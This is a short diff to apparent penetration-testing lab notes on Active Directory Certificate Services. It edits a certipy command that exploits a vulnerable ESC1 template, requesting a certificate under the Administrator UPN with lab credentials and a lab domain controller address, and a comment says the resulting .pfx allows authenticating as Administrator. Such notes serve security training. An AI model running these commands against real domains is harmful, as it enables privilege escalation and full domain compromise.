@@ -29,7 +29,7 @@ certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vuln
 %% find vulnerabilities in ADCS %%
 
 ```
-certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
+certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -dc-host LAB-DC.lab.local -target LAB-DC.lab.local -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
 ```
 %% certificate request with alternative SAN which creates a cert file name administrator.pfx which we can use later to authenticate as Administrator %%
 
